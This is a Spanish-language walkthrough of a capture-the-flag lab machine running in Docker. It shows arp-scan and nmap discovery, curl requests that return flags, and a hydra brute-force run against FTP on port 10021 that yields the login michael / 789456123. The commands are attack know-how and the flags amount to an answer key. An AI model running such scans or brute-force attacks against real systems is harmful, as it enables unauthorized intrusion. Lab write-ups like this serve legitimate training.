Encendemos la máquina en el docker y tenemos que hacer descubrimiento sobre ella. Para ello como sabemos que está en la misma red local hacemos:
```
sudo arp-scan -I <Interfaz_docker> --localhost
```
Con esto descubrimos su `ip` `192.168.10.23`

Como tenemos su `ip` podemos hacer un `nmap` para descubrir que servicios tiene encendidos.
```
sudo nmap -sS -p- -n -Pn --min-rate <N> <TARGET_IP>
```

Ahora haremos un scaneo de los servicios que están corriendo:
```
sudo nmap -sCV -p22,110,139,143,445,993,995,4443,8080,10021 <TARGET_IP>
AS{apachessl_NMAPCHECK}
```
Encontramos una #flag 

Vamos a probar a hacer `curl` a los servicios `http` y `https`:

```
$ curl 192.168.10.23:8080
AS_{http8080_COMPROBARHTTPS}
```
Nos responde con una #flag 

Intentamos hacer una conexión no certificada por `https` y con --verbose:
```
$ curl -vk https://192.168.10.23:4443
AS_{https4443_BUSCARDIRECTORIOS}
```
Nos responde con una #flag

Para el servicio `ftp` que está en el puerto `10021` podemos intentar hacer un ataque de fuerza bruta:
```
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.23:10021
```
sacamos varios usuarios entre ellos `login: michael   password: 789456123`
